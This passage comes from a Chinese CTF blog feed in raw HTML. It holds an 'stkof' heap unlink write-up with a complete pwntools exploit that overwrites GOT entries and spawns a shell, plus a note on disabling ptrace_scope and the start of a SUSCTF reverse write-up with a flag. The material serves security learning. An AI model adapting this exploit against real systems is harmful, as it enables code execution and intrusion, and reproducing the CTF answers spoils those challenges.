<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v2 <span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
ptr<span class="token punctuation">[</span><span class="token operator">++</span>dword_602100<span class="token punctuation">]</span> <span class="token operator">=</span> v2<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//指针存在于全局变量中 跟入++dword_60210即可查看到</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dword_602100<span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h3 id="edite"><a href="#edite" class="headerlink" title="edite"></a>edite</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v5<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
v2 <span class="token operator">=</span> <span class="token function">atol</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">></span> <span class="token number">0x100000</span> <span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>ptr<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
<span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v5<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
v3 <span class="token operator">=</span> <span class="token function">atoll</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
v4 <span class="token operator">=</span> ptr<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// 无限制读入大小 可以无限制读入 导致溢出</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> v3<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> v3<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
  v4 <span class="token operator">+</span><span class="token operator">=</span> i<span class="token punctuation">;</span>
  v3 <span class="token operator">-</span><span class="token operator">=</span> i<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span>
  result <span class="token operator">=</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
<span class="token keyword">else</span>
  result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> result<span class="token punctuation">;</span>
</code></pre>
<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v2<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
v1 <span class="token operator">=</span> <span class="token function">atol</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">0x100000</span> <span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
<span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//free chunk</span>
ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
</code></pre>
<p>那么存在堆溢出 并且无限制creat chunk and chunk size<br>满足unlink</p>
<h3 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h3><p>既然知道了需要构造unlink ，所以来屡屡怎么操作<br>1.至少创建3个chunk（4个也可以，第四个chunk用来写/bin/sh\x00）<br>2.防止top chunk 合并导致无法利用<br>3.64位程序 fd bk满足条件 </p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">fd <span class="token operator">=</span> ptr  <span class="token operator">-</span> <span class="token number">0x18</span>
bk <span class="token operator">=</span> ptr  <span class="token operator">-</span> <span class="token number">0x10</span>
</code></pre>
<p>4.注意ptr地址位全局变量地址+0x10（gdb调试可以看出）<br>5.leak出真实函数地址：puts atoi都可以<br>6.得到system函数地址<br>7.getshell</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> x/10gx 0x602140
0x602140:    0x0000000000000000    0x0000000000000000
0x602150:    0x0000000000e05a80    0x0000000000e05aa0
0x602160:    0x0000000000000000    0x0000000000000000
0x602170:    0x0000000000000000    0x0000000000000000
0x602180:    0x0000000000000000    0x0000000000000000
</code></pre>
<p>发现指针地址从 0x602150可写<br>而全局变量地址位 0x602140 所以 ptr地址=  0x602140+0x10</p>
<p>创建4个small chunk</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">alloc（<span class="token number">0x80</span>） <span class="token operator">//</span>idx1 use to leak puts addr
alloc（<span class="token number">0x80</span>）<span class="token operator">//</span>idx2  overflow to write a fake chunk 
alloc（<span class="token number">0x80</span>）<span class="token operator">//</span>idx3 use to unlink
alloc（<span class="token number">0x80</span>）<span class="token operator">//</span>idx4 write <span class="token operator">/</span>bin<span class="token operator">/</span>sh\x00
</code></pre>
<p>fake chunk 构造</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">ptr <span class="token operator">=</span> <span class="token number">0x602140</span><span class="token operator">+</span><span class="token number">0x10</span>
fd <span class="token operator">=</span> ptr <span class="token operator">-</span><span class="token number">0x18</span>
bk <span class="token operator">=</span>ptr<span class="token number">-0x10</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fake_chunk PRE_size</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fake_chunk size</span>
payload <span class="token operator">+=</span>p64<span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#fake_chunk fd</span>
payload <span class="token operator">+=</span>p64<span class="token punctuation">(</span>bk<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fake_chunk bk</span>
payload <span class="token operator">+=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token comment" spellcheck="true">#fake_string</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#overflow fake_chunk</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#overwrite chunk3 PRE_size</span>
edite<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#unlink fake chunk, now chunk2*ptr  =&amp;(chunk2*ptr) - 0x18 = ptr-0x10 - 8</span>
</code></pre>
<p>fgets接收的字符地址距离rsp 0x24<br>所以可以构造leak payload</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">payload1 <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
edite<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#overwrite </span>
edite<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># write puts.plt</span>
free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#leak puts addr</span>
data <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'OK\n'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
puts <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>
</code></pre>
<p>接着计算出system地址 以及在chunk4中写入/bin/sh\x00</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">system <span class="token operator">=</span> puts <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#binsh = puts - libc.symbols['puts']+next(libc.search('/bin/sh'))</span>
read_in<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># free_got => system_got</span>
read_in<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>
free_it<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./stkof'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'stkof'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">alloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"OK\n"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">read_in</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'OK\n'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">free_it</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#gdb.attach(p)</span>
ptr <span class="token operator">=</span> <span class="token number">0x602140</span> <span class="token operator">+</span><span class="token number">0x10</span>
alloc<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 1</span>
alloc<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 2</span>
alloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 3</span>
alloc<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 4</span>


payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fake chunk pre_size</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fake chunk size</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ptr<span class="token number">-0x18</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fake fd</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ptr<span class="token number">-0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fake bk</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x10</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#overflow fake chunk</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#overflow next chunk pre_size size</span>

read_in<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
free_it<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'OK\n'</span><span class="token punctuation">)</span>
payload1 <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">16</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

read_in<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload1<span class="token punctuation">)</span>
read_in<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
free_it<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>

data <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\nOK\n'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
puts <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>


<span class="token comment" spellcheck="true">#puts_addr = u64(p.recvuntil("\nOK\n",drop = True).ljust(8,'\x00'))</span>
<span class="token comment" spellcheck="true">#print hex(puts_addr)</span>
system <span class="token operator">=</span> puts <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#binsh = puts - libc.symbols['puts']+next(libc.search('/bin/sh'))</span>
read_in<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># free_got => system_got</span>
read_in<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>
free_it<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>成功getshell  此题只用与学习unlink操作 以及学习glibc保护机制<br>由于ubuntu18.04中对堆操作进行了修改 所以此unlink.py在ubuntu18.04中无法成功leak  在malloc4个smallchunk后出现和并（继续研究～）</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首先理解下unlink操作 &lt;/p&gt;
&lt;p&gt;初始三个chunk大小都为0x80&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;chunk1&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;chunk2&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;chunk3&lt;/th&gt;
&lt;/tr
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>GDB-attach-pid没有权限解决方法</title>
    <link href="http://iosmosis.github.io/2018/11/09/GDB-attach-pid%E6%B2%A1%E6%9C%89%E6%9D%83%E9%99%90%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <id>http://iosmosis.github.io/2018/11/09/GDB-attach-pid没有权限解决方法/</id>
    <published>2018-11-09T07:22:27.000Z</published>
    <updated>2018-11-09T07:52:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>gab调试时遇到</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> attach 15790
Attaching to process 15790
Could not attach to process.  If your uid matches the uid of the target
process, check the setting of /proc/sys/kernel/yama/ptrace_scope, or try
again as the root user.  For <span class="token function">more</span> details, see /etc/sysctl.d/10-ptrace.conf
warning: process 15790 is a zombie - the process has already terminated
ptrace: 不允许的操作.
</code></pre>
<p>解决方法：</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">➜  ~ <span class="token function">sudo</span> <span class="token function">vi</span> /etc/sysctl.d/10-ptrace.conf
</code></pre>
<p>将 </p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">kernel.yama.ptrace_scope <span class="token operator">=</span> 1
</code></pre>
<p>改为</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">kernel.yama.ptrace_scope <span class="token operator">=</span> 0
</code></pre>
<p>重启即可</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;gab调试时遇到&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;bash&quot; data-line_number=&quot;frontend&quot; data-trim_indent=&quot;backend&quot; data-label_position=&quot;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SUSCTF-Writeup(Reverse)</title>
    <link href="http://iosmosis.github.io/2018/10/29/SUSCTF-Writeup-Reverse/"/>
    <id>http://iosmosis.github.io/2018/10/29/SUSCTF-Writeup-Reverse/</id>
    <published>2018-10-29T08:04:11.000Z</published>
    <updated>2018-10-29T12:11:54.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="60"><a href="#60" class="headerlink" title="60"></a>60</h3><p><img src="/2018/10/29/SUSCTF-Writeup-Reverse/1.png" alt=""><br>下载载入IDA 查看</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4h] [rbp-Ch]</span>
  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-8h]</span>

  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Guess number: "</span><span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token number">2333333</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Congraz! You are right. This is your flag: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Nop. You should try harder~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>逻辑很简单 输入2333333即可getflag<br><img src="/2018/10/29/SUSCTF-Writeup-Reverse/2.png" alt=""> </p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">FLAG <span class="token punctuation">:</span> SUSCTF<span class="token punctuation">{</span>H3llo_wOr1d<span class="token operator">!</span><span class="token punctuation">}</span>
</code></pre>
<h3 id="70"><a href="#70" class="headerlink" title="70"></a>70</h3><p><img src="/2018/10/29/SUSCTF-Writeup-Reverse/3.png" alt=""><br>提示工具   uncompyle6</p>
<p>安装完毕 运行</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">uncompyle6 HelloPython.pyc
</code></pre>
<p>得到源代码</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">➜  下载 uncompyle6 HelloPython<span class="token punctuation">.</span>pyc
<span class="token comment" spellcheck="true"># uncompyle6 version 3.2.4</span>
<span class="token comment" spellcheck="true"># Python bytecode 3.6 (3379)</span>
<span class="token comment" spellcheck="true"># Decompiled from: Python 2.7.15rc1 (default, Apr 15 2018, 21:51:34) </span>
<span class="token comment" spellcheck="true"># [GCC 7.3.0]</span>
